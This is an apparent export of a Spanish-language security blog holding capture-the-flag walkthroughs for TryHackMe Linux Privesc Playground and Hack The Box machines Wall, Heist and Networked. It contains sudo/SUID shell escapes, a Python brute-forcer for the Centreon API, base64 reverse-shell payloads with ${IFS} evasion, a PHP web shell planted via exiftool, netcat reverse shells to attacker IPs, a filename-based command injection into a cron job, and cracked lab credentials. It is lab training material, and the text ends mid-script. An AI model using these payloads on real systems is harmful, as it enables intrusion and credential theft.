base64 \u0026#34;$LFILE\u0026#34; | base64 --decode   /bin/bash Comando:\n1  sudo bash   /bin/busybox Comando:\n1  sudo busybox sh   /bin/cat Comando:\n1  sudo /bin/cat /root/flag.txt   /bin/chmod Comando:\n1 2  LFILE=/root/flag.txt sudo chmod 0777 $LFILE   /bin/chown Comando:\n1 2  LFILE=/root/flag.txt sudo /bin/chown $(id -un):$(id -gn) $LFILE   /bin/cp Comando:\n1 2 3 4  FLAG=/tmp/flag.txt TF=/root/flag.txt sudo /bin/cp $TF $FLAG cat $FLAG   /usr/bin/cpan Comando:\n1  sudo cpan   Elegimos no a las opciones hasta CPAN site, entonces \u0026lsquo;Autoconfiguration complete.\u0026rsquo; y escribimos el siguiente comando:\n1  ! exec \u0026#39;/bin/bash\u0026#39;   /bin/crontab Comando:\n1  sudo /bin/crontab -e   Seleccionamos el editor Vim, presionamos ESC y escribimos :!sh.\n/usr/bin/cut Comando:\n1 2  LFILE=/root/flag.txt sudo cut -d \u0026#34;\u0026#34; -f1 \u0026#34;$LFILE\u0026#34;   ","description":"Linux Privesc Playground es una maquina de TryHackMe que presenta distintos ficheros SUID para practicar escalar privilegios en Linux.","id":124,"section":"posts","tags":["GTFObins","SUID"],"title":"TryHackMe - Linux Privesc Playground","uri":"https://sckull.github.io/posts/linuxprivescplayground/"},{"content":"  Wall presenta Centreon, en esta version realizamos un ataque de fuerza bruta a la API para encontrar las credenciales del administrador. Además enocntramos una vulnerabilidad RCE por la cual obtuvimos acceso a la maquina. Enumeramos los ficheros SUID y escalamos privilegios por Screen.\nInformacion de la Maquina    Nombre Wall      OS Linux   Puntos 30   Dificultad Media   IP 10.10.10.157   Maker askar    Matrix   { \u0026quot;type\u0026quot;:\u0026quot;radar\u0026quot;, \u0026quot;data\u0026quot;:{ \u0026quot;labels\u0026quot;:[\u0026quot;Enumeration\u0026quot;,\u0026quot;Real-Life\u0026quot;,\u0026quot;CVE\u0026quot;,\u0026quot;Custom Explotation\u0026quot;,\u0026quot;CTF-Like\u0026quot;], \u0026quot;datasets\u0026quot;:[ { \u0026quot;label\u0026quot;:\u0026quot;User Rate\u0026quot;, \u0026quot;data\u0026quot;:[6.5, 4.6, 7.3, 2.7, 5.4], \u0026quot;backgroundColor\u0026quot;:\u0026quot;rgba(75, 162, 189,0.5)\u0026quot;, \u0026quot;borderColor\u0026quot;:\u0026quot;#4ba2bd\u0026quot; }, { \u0026quot;label\u0026quot;:\u0026quot;Maker Rate\u0026quot;, \u0026quot;data\u0026quot;:[0, 0, 0, 0, 0], \u0026quot;backgroundColor\u0026quot;:\u0026quot;rgba(154, 204, 20,0.5)\u0026quot;, \u0026quot;borderColor\u0026quot;:\u0026quot;#9acc14\u0026quot; } ] }, \u0026quot;options\u0026quot;: {\u0026quot;scale\u0026quot;: {\u0026quot;ticks\u0026quot;: {\u0026quot;backdropColor\u0026quot;:\u0026quot;rgba(0,0,0,0)\u0026quot;}, \u0026quot;angleLines\u0026quot;:{\u0026quot;color\u0026quot;:\u0026quot;rgba(255, 255, 255,0.6)\u0026quot;}, \u0026quot;gridLines\u0026quot;:{\u0026quot;color\u0026quot;:\u0026quot;rgba(255, 255, 255,0.6)\u0026quot;} } } }     MASSCAN \u0026amp; NMAP Escaneo de puerto tcp/udp, en el cual nos muestra el puerto http (80) y el puerto de ssh (22) abierto.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40  root@kali:~/htb/wall# masscan -p1-65535,U:1-65535 10.10.10.157 --rate=1000 -e tun0 Starting masscan 1.0.5 (http://bit.ly/14GZzcT) at 2019-09-25 07:02:40 GMT -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth Initiating SYN Stealth Scan Scanning 1 hosts [131070 ports/host] Discovered open port 22/tcp on 10.10.10.157 Discovered open port 80/tcp on 10.10.10.157 # Nmap 7.80 scan initiated Wed Sep 25 03:46:47 2019 as: nmap -p- --min-rate 1000 -o nmap.scan 10.10.10.157 Warning: 10.10.10.157 giving up on port because retransmission cap hit (10). Nmap scan report for 10.10.10.157 Host is up (0.19s latency). Not shown: 65530 closed ports PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 32187/tcp filtered unknown 33879/tcp filtered unknown 48249/tcp filtered unknown # Nmap done at Wed Sep 25 03:48:33 2019 -- 1 IP address (1 host up) scanned in 106.19 seconds # Nmap 7.80 scan initiated Wed Sep 25 03:51:32 2019 as: nmap -sV -sC -p22,80 -o nmap_scan 10.10.10.157 Nmap scan report for 10.10.10.157 Host is up (0.24s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 2e:93:41:04:23:ed:30:50:8d:0d:58:23:de:7f:2c:15 (RSA) | 256 4f:d5:d3:29:40:52:9e:62:58:36:11:06:72:85:1b:df (ECDSA) |_ 256 21:64:d0:c0:ff:1a:b4:29:0b:49:e1:11:81:b6:73:66 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Apache2 Ubuntu Default Page: It works Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Wed Sep 25 03:51:50 2019 -- 1 IP address (1 host up) scanned in 18.00 seconds   HTTP - Puerto 80 La pagina web esta corriendo en un Apache/2.4.29.\nGOBUSTER Gobuster nos muestra las siguientes rutas de la pagina web.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25  root@kali:~/htb/wall# gobuster dir -u http://10.10.10.157/ -w /usr/share/wordlists/dirb/common.txt -n -x php,txt,html -t 15 =============================================================== Gobuster v3.0.1 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@_FireFart_) =============================================================== [+] Url: http://10.10.10.157/ [+] Threads: 15 [+] Wordlist: /usr/share/wordlists/dirb/common.txt [+] Status codes: 200,204,301,302,307,401,403 [+] User Agent: gobuster/3.0.1 [+] Extensions: php,txt,html [+] No status: true [+] Timeout: 10s =============================================================== 2019/09/25 03:53:54 Starting gobuster =============================================================== /aa.php /index.html /index.html /monitoring /panel.php /server-status =============================================================== 2019/09/25 03:56:21 Finished ===============================================================   /aa.php /monitoring /panel.php Realizamos nuevamente una busqueda con un diccionario diferente y encontramos las siguientes rutas.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24  root@kali:~/htb/wall# gobuster dir -u http://10.10.10.157/ -w /usr/share/wordlists/subdscan.txt -n -x php,txt,html -t 15 -z =============================================================== Gobuster v3.0.1 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@_FireFart_) =============================================================== [+] Url: http://10.10.10.157/ [+] Threads: 15 [+] Wordlist: /usr/share/wordlists/subdscan.txt [+] Status codes: 200,204,301,302,307,401,403 [+] User Agent: gobuster/3.0.1 [+] Extensions: php,txt,html [+] No status: true [+] Timeout: 10s =============================================================== 2019/09/27 01:12:38 Starting gobuster =============================================================== /aa.php /centreon /index.html /monitoring /panel.php =============================================================== 2019/09/27 01:17:42 Finished ===============================================================   Centreon - RCE /centreon Encontramos la plataforma de centreon de codigo abierto para el monitoreo de software o administracion de infraestructura en su version 19.04.0, al investigar un poco acerca de esta plataforma y su version vemos que existe una vulnerabilidad (CVE-2019-13024) en la plataforma que permite ejecutar codigo remoto (RCE). Para explotar esta vulnerabilidad necesitamos las credenciales de centreon.\nAPI - Centreon Utilizamos python para hacer un ataque de fuerza bruta contra la plataforma utilizando el diccionario rockyou.txt con la siguiente configuracion y utilizando la API de centreon.\nDocumentation Centreon - API\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23  #!/usr/bin/python import requests import json filepath = \u0026#39;/usr/share/wordlists/rockyou.txt\u0026#39; url = \u0026#39;http://10.10.10.157/centreon/api/index.php?action=authenticate\u0026#39; with open(filepath) as fp: line = fp.readline() while line:\tpassword_r = \u0026#39;{\u0026#34;username\u0026#34;:\u0026#34;admin\u0026#34;, \u0026#34;password\u0026#34;:\u0026#34;_pass_\u0026#34;}\u0026#39;.replace(\u0026#39;_pass_\u0026#39;, line.strip()) data = json.loads(password_r) response = requests.post(url, data=data) result = response.json() if result == \u0026#34;Bad credentials\u0026#34;: print(\u0026#34;Password Incorrecta\u0026#34;) elif result == \u0026#34;Bad parameters\u0026#34;: print(\u0026#34;Error en request\u0026#34;) else:\tprint(\u0026#34;User:Pass \u0026#34; + str(data[\u0026#34;username\u0026#34;]+\u0026#34;:\u0026#34;+str(data[\u0026#34;password\u0026#34;])))\tbreak line = fp.readline()   Encontramos la contraseña para el usuario admin:password1:\nHydra Una manera mas facil y sencilla de hacerlo es con hydra:\n1  hydra -l admin -P /usr/share/wordlists/rockyou.txt -s 80 10.10.10.157 http-post-form \u0026#34;/centreon/api/index.php?action=authenticate:username=^USER^\u0026amp;password=^PASS^:Bad credentials\u0026#34;   RCE - Explotacion | Shell Para explotar la vulnerabilidad de esta plataforma utilizamos el exploit Centreon RCE, al utilizar el exploit y pasarle las credenciales y la url no ejecuta comandos dentro de la maquina, para poder ejecutar comandos utilizamos base64 y shell evasion ya que no permite ejecutar comandos en texto plano.\nInternal Variables\nPrimero codificamos nuestra shell inversa en base64 omitiendo los saltos de linea, luego creamos nuestro comando para ejecucion en la plataforma en donde cada espacio es ${IFS}, y se agrega de ultimo punto y coma (;) ya que la vulnerabilidad permite ejecutar comandos con ciertos parametros (-v /usr/local/centreon/filesGeneration/engine/1/centengine.DEBUG 2\u0026gt;\u0026amp;1) y agregamos esto ultimo para que no ejecute los parametros por default.\n1 2 3  echo -n \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.145/7878 0\u0026gt;\u0026amp;1\u0026#34; | base64 YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xNDUvNzg3OCAwPiYx echo${IFS}-n${IFS}YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xNDUvNzg3OCAwPiYx${IFS}|${IFS}base64${IFS}-d${IFS}|${IFS}bash${IFS};   Agregamos el siguiente codigo por encima de payload_info:\n1  payload_shell = str(repr(\u0026#34;echo${IFS}-n${IFS}YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xNDUvNzg3OCAwPiYx${IFS}|${IFS}base64${IFS}-d${IFS}|${IFS}bash${IFS};\u0026#34;)).strip(\u0026#34;\u0026#39;\u0026#34;)   Y dentro de payload_info cambiamos:\n1 2 3  \u0026#34;nagios_bin\u0026#34;: \u0026#34;ncat -e /bin/bash {0} {1} #\u0026#34;.format(ip, port), por: \u0026#34;nagios_bin\u0026#34;: \u0026#34;{}\u0026#34;.format(payload_shell),   Ejecutamos nuestro exploit los parametros de IP y Puerto no importan ya que hemos codificado nuestra shell inversa:\nObtenemos una shell como usuario www-data:\nPrivilege Escalation Como en cualquier maquina realizamos una enumeracion de archivos y binarios que puedan ayudarnos a escalar privilegios a otro usuario en este caso fue distinto ya que la maquina contenia un binario vulnerable que permitia escalar privilegios de administracion.\nSUID - Screen 4.5.0 Trasladamos y ejecutamos el exploit en la maquina y obtenemos una shell con el usuario root y las flags user.txt y root.txt.\n","description":"Wall presenta Centreon, en esta version realizamos un ataque de fuerza bruta a la API para encontrar las credenciales del administrador. Además enocntramos una vulnerabilidad RCE por la cual obtuvimos acceso a la maquina. Enumeramos los ficheros SUID y escalamos privilegios por Screen.","id":125,"section":"posts","tags":["centreon","suid"],"title":"Hack The Box - Wall","uri":"https://sckull.github.io/posts/wall/"},{"content":"  Inicialmente se muestra un fichero en la pagina web el cual contiene credenciales cisco encriptadas, con ellas pudimos enumerar algunos usuarios con Impacket y con WinRM obtener acceso. Enumerando los archivos de la pagina inicial encontramos el hash del Adminstrador el cual crackeamos y obtuvimos acceso privilegiado.\nInformacion de la Maquina    Nombre Heist      OS Windows   Puntos 20   Dificultad Facil   IP 10.10.10.149   Maker MinatoTW    Matrix   { \u0026quot;type\u0026quot;:\u0026quot;radar\u0026quot;, \u0026quot;data\u0026quot;:{ \u0026quot;labels\u0026quot;:[\u0026quot;Enumeration\u0026quot;,\u0026quot;Real-Life\u0026quot;,\u0026quot;CVE\u0026quot;,\u0026quot;Custom Explotation\u0026quot;,\u0026quot;CTF-Like\u0026quot;], \u0026quot;datasets\u0026quot;:[ { \u0026quot;label\u0026quot;:\u0026quot;User Rate\u0026quot;, \u0026quot;data\u0026quot;:[7.8, 7.2, 4.4, 5.6, 2.8], \u0026quot;backgroundColor\u0026quot;:\u0026quot;rgba(75, 162, 189,0.5)\u0026quot;, \u0026quot;borderColor\u0026quot;:\u0026quot;#4ba2bd\u0026quot; }, { \u0026quot;label\u0026quot;:\u0026quot;Maker Rate\u0026quot;, \u0026quot;data\u0026quot;:[6, 9, 3, 7, 1], \u0026quot;backgroundColor\u0026quot;:\u0026quot;rgba(154, 204, 20,0.5)\u0026quot;, \u0026quot;borderColor\u0026quot;:\u0026quot;#9acc14\u0026quot; } ] }, \u0026quot;options\u0026quot;: {\u0026quot;scale\u0026quot;: {\u0026quot;ticks\u0026quot;: {\u0026quot;backdropColor\u0026quot;:\u0026quot;rgba(0,0,0,0)\u0026quot;}, \u0026quot;angleLines\u0026quot;:{\u0026quot;color\u0026quot;:\u0026quot;rgba(255, 255, 255,0.6)\u0026quot;}, \u0026quot;gridLines\u0026quot;:{\u0026quot;color\u0026quot;:\u0026quot;rgba(255, 255, 255,0.6)\u0026quot;} } } }     MASSCAN \u0026amp; NMAP Escaneo de puertos tcp/udp con masscan y nmap.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44  root@kali:~/htb/heist# masscan -p1-65535,U:1-65535 10.10.10.149 --rate=1000 -e tun0 Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2019-08-21 06:23:36 GMT -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth Initiating SYN Stealth Scan Scanning 1 hosts [131070 ports/host] Discovered open port 49668/tcp on 10.10.10.149 Discovered open port 445/tcp on 10.10.10.149 Discovered open port 135/tcp on 10.10.10.149 Discovered open port 5985/tcp on 10.10.10.149 Discovered open port 80/tcp on 10.10.10.149 # Nmap 7.70 scan initiated Wed Aug 21 02:32:58 2019 as: nmap -sC -sV -p 49668,445,135,5985,80 -o nmap.scan 10.10.10.149 Nmap scan report for 10.10.10.149 Host is up (0.39s latency). PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 10.0 | http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set |_http-server-header: Microsoft-IIS/10.0 | http-title: Support Login Page |_Requested resource was login.php 135/tcp open msrpc Microsoft Windows RPC 445/tcp open microsoft-ds? 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 49668/tcp open msrpc Microsoft Windows RPC Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: mean: 32s, deviation: 0s, median: 32s | smb2-security-mode: | 2.02: |_ Message signing enabled but not required | smb2-time: | date: 2019-08-21 02:34:36 |_ start_date: N/A Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Wed Aug 21 02:34:42 2019 -- 1 IP address (1 host up) scanned in 103.97 seconds   HTTP - PUERTO 80 Al visitar este puerto nos muestra un panel de inicio de sesion de una plataforma.\nIniciamos sesion como invitado (Login as guest) y nos redirige a una nueva pagina issues.php en la cual contiene un chat de un cliente que muestra los errores que tuvo con su router cisco y una lista de errores dentro de un archivo.\nArchivo:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41  version 12.2 no service pad service password-encryption ! isdn switch-type basic-5ess ! hostname ios-1 ! security passwords min-length 12 enable secret 5 $1$pdQG$o8nrSzsGXeaduXrjlvKc91 ! username rout3r password 7 0242114B0E143F015F5D1E161713 username admin privilege 15 password 7 02375012182C1A1D751618034F36415408 ! ! ip ssh authentication-retries 5 ip ssh version 2 ! ! router bgp 100 synchronization bgp log-neighbor-changes bgp dampening network 192.168.0.0Â mask 300.255.255.0 timers bgp 3 9 redistribute connected ! ip classless ip route 0.0.0.0 0.0.0.0 192.168.0.1 ! ! access-list 101 permit ip any any dialer-list 1 protocol ip list 101 ! no ip http server no ip http secure-server ! line vty 0 4 session-timeout 600 authorization exec SSH transport input ssh   Encontramos dentro del archivo usuarios y contraseñas:\n$1$pdQG$o8nrSzsGXeaduXrjlvKc91 username rout3r password 7 0242114B0E143F015F5D1E161713 username admin privilege 15 password 7 02375012182C1A1D751618034F36415408 La primera contraseña la crackeamos con hashcat:\n1  stealth1agent:$1$pdQG$o8nrSzsGXeaduXrjlvKc91   Las dos ultimas utilizamos un script que nos devuelve el valor del hash, este hash es de tipo 7 de Cisco:\n  Decode Cisco Password Hash\n  Cisco Password\n  Password Cracker\n  1 2  $uperP@ssword:0242114B0E143F015F5D1E161713 Q4)sJu\\Y8qz*A3?d:02375012182C1A1D751618034F36415408   SMBMAP Ahora que tenemos usuairos y contraseñas intentamos listar sharenames, con el unico usuario con el cual nos dejó fue con el usuario hazard.\nIMPACKET - LOOKUPSID  Impacket toolkit  Utilizamos el script lookupsid.py de impacket para poder obtener los usuarios o grupo de usuarios dentro de la maquina.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  root@kali:~/htb/heist/evil-winrm# lookupsid.py hazard:stealth1agent@10.10.10.149 Impacket v0.9.20-dev - Copyright 2019 SecureAuth Corporation [*] Brute forcing SIDs at 10.10.10.149 [*] StringBinding ncacn_np:10.10.10.149[\\pipe\\lsarpc] [*] Domain SID is: S-1-5-21-4254423774-1266059056-3197185112 500: SUPPORTDESK\\Administrator (SidTypeUser) 501: SUPPORTDESK\\Guest (SidTypeUser) 503: SUPPORTDESK\\DefaultAccount (SidTypeUser) 504: SUPPORTDESK\\WDAGUtilityAccount (SidTypeUser) 513: SUPPORTDESK\\None (SidTypeGroup) 1008: SUPPORTDESK\\Hazard (SidTypeUser) 1009: SUPPORTDESK\\support (SidTypeUser) 1012: SUPPORTDESK\\Chase (SidTypeUser) 1013: SUPPORTDESK\\Jason (SidTypeUser)   CREDENCIALES hazard:stealth1agent rout3r:$uperP@ssword admin:Q4)sJu\\Y8qz*A3?d chase:Q4)sJu\\Y8qz*A3?d jason: support: CHASE - USER  WinRm  Dentro de los puertos abiertos que encontramos vemos que winrm (5985) esta abierto, utilizamos las credenciales y usuarios que encontramos para intentar logearnos mediante este puerto.\nUtilizamos un script en ruby con la libreria winrm para poder ejecutar comandos:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21  require \u0026#39;winrm\u0026#39; conn = WinRM::Connection.new( endpoint: \u0026#39;http://10.10.10.149:5985/wsman\u0026#39;, user: \u0026#39;chase\u0026#39;, password: \u0026#39;Q4)sJu\\Y8qz*A3?d\u0026#39;, ) command=\u0026#34;\u0026#34; conn.shell(:powershell) do |shell| until command == \u0026#34;exit\\n\u0026#34; do print \u0026#34;PS \u0026gt; \u0026#34; command = gets output = shell.run(command) do |stdout, stderr| STDOUT.print stdout STDERR.print stderr end end puts \u0026#34;Exiting with code #{output.exitcode}\u0026#34; end   Podemos ejecutar comandos en la maquina y obtenemos nuestra bandera user.txt.\nPRIVILEGE ESCALATION Estando dentro de la maquina buscamos archivos en los cuales pudiesen haber contraseñas, principalmente los archivos que se utilizan en la plataforma/inicio de sesion de la pagina que contiene la maquina. Encontramos que, dentro del archivo login.php hay una condicion con dos usuarios que pueden logearse: guest y admin.\nlogin.php\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  \u0026lt;?php session_start(); if( isset($_REQUEST[\u0026#39;login\u0026#39;]) \u0026amp;\u0026amp; !empty($_REQUEST[\u0026#39;login_username\u0026#39;]) \u0026amp;\u0026amp; !empty($_REQUEST[\u0026#39;login_password\u0026#39;])) { if( $_REQUEST[\u0026#39;login_username\u0026#39;] === \u0026#39;admin@support.htb\u0026#39; \u0026amp;\u0026amp; hash( \u0026#39;sha256\u0026#39;, $_REQUEST[\u0026#39;login_password\u0026#39;]) === \u0026#39;91c077fb5bcdd1eacf7268c945bc1d1ce2faf9634cba615337adbf0af4db9040\u0026#39;) { $_SESSION[\u0026#39;admin\u0026#39;] = \u0026#34;valid\u0026#34;; header(\u0026#39;Location: issues.php\u0026#39;); } else header(\u0026#39;Location: errorpage.php\u0026#39;); } else if( isset($_GET[\u0026#39;guest\u0026#39;]) ) { if( $_GET[\u0026#39;guest\u0026#39;] === \u0026#39;true\u0026#39; ) { $_SESSION[\u0026#39;guest\u0026#39;] = \u0026#34;valid\u0026#34;; header(\u0026#39;Location: issues.php\u0026#39;); } } ?\u0026gt;   Utilizamos la paigna de md5decrypt para verificar si existe esta contraseña dentro de la pagina:\n md5decrypt  admin@support.htb:91c077fb5bcdd1eacf7268c945bc1d1ce2faf9634cba615337adbf0af4db9040 admin@support.htb:4dD!5}x/re8]FBuZ Verificamos mediante samba que el usuario es administrator y, si este tiene permisos.\nConfirmamos que es el usuario y contraseña de administrator, utilizamos nuevamente el script para winrm con las credenciales.\nObtenemos una shell y nuestra bandera root.txt.\n","description":"Inicialmente se muestra un fichero en la pagina web el cual contiene credenciales cisco encriptadas, con ellas pudimos enumerar algunos usuarios con Impacket y con WinRM obtener acceso. Enumerando los archivos de la pagina inicial encontramos el hash del Adminstrador el cual crackeamos y obtuvimos acceso privilegiado.","id":126,"section":"posts","tags":["smbmap","impacket","winrm"],"title":"Hack The Box - Heist","uri":"https://sckull.github.io/posts/heist/"},{"content":"  Encontramos una pagina web donde pudimos subir una web shell realizando Bypass utilizando exiftool. Un CronJob nos permitio ejecutar una shell inversa y acceder al siguiente usuario. Escalamos privilegios ejecutando una shell a travez de un script de bash.\nInformacion de la Maquina    Nombre Networked      OS Linux   Puntos 20   Dificultad Facil   IP 10.10.10.146   Maker guly    Matrix   { \u0026quot;type\u0026quot;:\u0026quot;radar\u0026quot;, \u0026quot;data\u0026quot;:{ \u0026quot;labels\u0026quot;:[\u0026quot;Enumeration\u0026quot;,\u0026quot;Real-Life\u0026quot;,\u0026quot;CVE\u0026quot;,\u0026quot;Custom Explotation\u0026quot;,\u0026quot;CTF-Like\u0026quot;], \u0026quot;datasets\u0026quot;:[ { \u0026quot;label\u0026quot;:\u0026quot;User Rate\u0026quot;, \u0026quot;data\u0026quot;:[5.5, 4.8, 4.2, 5.8, 5.2], \u0026quot;backgroundColor\u0026quot;:\u0026quot;rgba(75, 162, 189,0.5)\u0026quot;, \u0026quot;borderColor\u0026quot;:\u0026quot;#4ba2bd\u0026quot; }, { \u0026quot;label\u0026quot;:\u0026quot;Maker Rate\u0026quot;, \u0026quot;data\u0026quot;:[7, 5, 3, 7, 5], \u0026quot;backgroundColor\u0026quot;:\u0026quot;rgba(154, 204, 20,0.5)\u0026quot;, \u0026quot;borderColor\u0026quot;:\u0026quot;#9acc14\u0026quot; } ] }, \u0026quot;options\u0026quot;: {\u0026quot;scale\u0026quot;: {\u0026quot;ticks\u0026quot;: {\u0026quot;backdropColor\u0026quot;:\u0026quot;rgba(0,0,0,0)\u0026quot;}, \u0026quot;angleLines\u0026quot;:{\u0026quot;color\u0026quot;:\u0026quot;rgba(255, 255, 255,0.6)\u0026quot;}, \u0026quot;gridLines\u0026quot;:{\u0026quot;color\u0026quot;:\u0026quot;rgba(255, 255, 255,0.6)\u0026quot;} } } }     MASSCAN \u0026amp; NMAP Escaneo de puertos tcp/udp con masscan y nmap.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25  root@kali:~/htb/networked# masscan -p1-65535,U:1-65535 10.10.10.146 --rate=1000 -e tun0 Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2019-08-27 23:43:29 GMT -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth Initiating SYN Stealth Scan Scanning 1 hosts [131070 ports/host] Discovered open port 80/tcp on 10.10.10.146 Discovered open port 22/tcp on 10.10.10.146 # Nmap 7.70 scan initiated Tue Aug 27 22:49:04 2019 as: nmap -sC -sV -p80,22 -o nmap.scan 10.10.10.146 Nmap scan report for 10.10.10.146 Host is up (0.087s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.4 (protocol 2.0) | ssh-hostkey: | 2048 22:75:d7:a7:4f:81:a7:af:52:66:e5:27:44:b1:01:5b (RSA) | 256 2d:63:28:fc:a2:99:c7:d4:35:b9:45:9a:4b:38:f9:c8 (ECDSA) |_ 256 73:cd:a0:5b:84:10:7d:a7:1c:7c:61:1d:f5:54:cf:c4 (ED25519) 80/tcp open http Apache httpd 2.4.6 ((CentOS) PHP/5.4.16) |_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16 |_http-title: Site doesn\u0026#39;t have a title (text/html; charset=UTF-8). Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Tue Aug 27 22:49:14 2019 -- 1 IP address (1 host up) scanned in 10.16 seconds   HTTP Visitamos la pagina que se encuentra en el puerto 80 y nos muestra lo siguiente.\nAdemas de eso en el codigo fuente nos muestra un comentario relacionado a una galeria.\nDIRBUSTER Utilizamos dirbuster para busqueda de direcotrios y paginas.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28  root@kali:~/htb/networked# gobuster dir -u http://10.10.10.146/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html -n -t 15 =============================================================== Gobuster v3.0.1 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@_FireFart_) =============================================================== [+] Url: http://10.10.10.146/ [+] Threads: 15 [+] Wordlist: /usr/share/wordlists/dirb/common.txt [+] Status codes: 200,204,301,302,307,401,403 [+] User Agent: gobuster/3.0.1 [+] Extensions: txt,html,php [+] No status: true [+] Timeout: 10s =============================================================== 2019/08/27 22:46:10 Starting gobuster =============================================================== /backup /cgi-bin/ /cgi-bin/.html /index.php /index.php /lib.php /photos.php /upload.php /uploads =============================================================== 2019/08/27 22:48:15 Finished ===============================================================   BACKUP - backup.tar Visitamos la pagina backup y encontramos un archivo \u0026lsquo;backup.tar\u0026rsquo; que al extraer los archivos que contiene nos muestra el codigo fuente de las paginas que encontramos con dirbuster.\nAnalizamos el codigo fuente de los archivos, encontramos que, en la pagina upload.php podemos subir archivos de los cuales solo archivos de tipo imagen estan permitidos.\nBYPASS - Upload Shell Utilizamos exiftool para añadir codigo php para ejecucion de comandos en una de las imagenes que descargamos de photos.php, luego de esto cambiamos el nombre del archivo y le añadimos .php.jpg como extension.\n1 2  exiftool -Comment=\u0026#39;\u0026lt;?php echo \u0026#34;\u0026lt;pre\u0026gt;\u0026#34;; system($_GET[\u0026#39;cmd\u0026#39;]); ?\u0026gt;\u0026#39; 127.jpg mv 127.jpg 127.php.jpg   Visitamos la pagina photos.php y nos aparece nuestra imagen/shell uploaded by 10_10_15_129.php.png.\nLe pasamos los parametros ?cmd=whoami;pwd a nuestra imagen y nos devuelve la ejecucion de comandos, un tanto desordenada con los datos de la imagen.\nLe pasamos parametros para obtener una shell inversa con netcat.\n1  nc -e /bin/bash 10.10.15.129 1337   Obtenemos nuestra shell como usuario apache.\nUSUARIO - GULY Dentro de los archivos que encontramos en la carpeta principal del usuario guly, de los cuales podemos leer solo dos, vemos un archivo de tipo cronjob y uno de php.\nEl archivo cron se encarga de ejecutar el comando php /home/guly/check_attack.php cada 3 mins.\nEl segundo archivo evalua los archivos que se encuentran en /var/www/html/uploads/, si encuentra un archivo que no esta dentro de las extensiones del whitelist de lib.php lo elimina, pero lo hace con los siguientes comandos:\n1 2  exec(\u0026#34;rm -f $logpath\u0026#34;); exec(\u0026#34;nohup /bin/rm -f $path$value \u0026gt; /dev/null 2\u0026gt;\u0026amp;1 \u0026amp;\u0026#34;);   Las variables que nos interesan son:\n1 2  $path = \u0026#39;/var/www/html/uploads/\u0026#39;; $logpath = \u0026#39;/tmp/attack.log\u0026#39;;   Sabiendo esto vamos a aprovechar la segunda ejecucion de comandos, en la cual se le pasa los parametros:\n1  nohup /bin/rm -f $path$value \u0026gt; /dev/null 2\u0026gt;\u0026amp;1 \u0026amp;   En este caso toma la variable $path donde se encuentran todos los archivos y $value el nombre del archivo a eliminar, en este caso seria de la siguiente forma /var/www/html/uploads/whatever.php, para aprovechar este comando utilizamos touch para crear el siguiente archivo (nombre):\n1  ; nc -c bash 10.10.15.129 1338   Y para cuando el cron se active y ejecute el archivo y, al borrar nuestro archivo va a ejecutar lo siguiente:\n1  nohup /bin/rm -f /var/www/html/uploads/; nc -c bash 10.10.15.129 1338 \u0026gt; /dev/null 2\u0026gt;\u0026amp;1 \u0026amp;   Por lo que va a ejecutar nuestra shell inversa y obtenemos nuestra bandera user.txt.\nPRIVILEGE ESCALATION Agregamos nuestra clave a authorized_keys del usuario guly y nos logeamos al servicio ssh. Ejecutamos el comando sudo -l -l y nos muestra un archivo que se ejecuta como usuario root.\nJail Escaping Bash Utilizamos la \u0026ldquo;tecnica\u0026rdquo; para escapar de una shell bash. Para ello al preguntarnos sobre las variables le pasamos un comando el cual va a ejecutar.\nJail Escaping Bash\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22  /usr/local/sbin/changename.sh #!/bin/bash -p cat 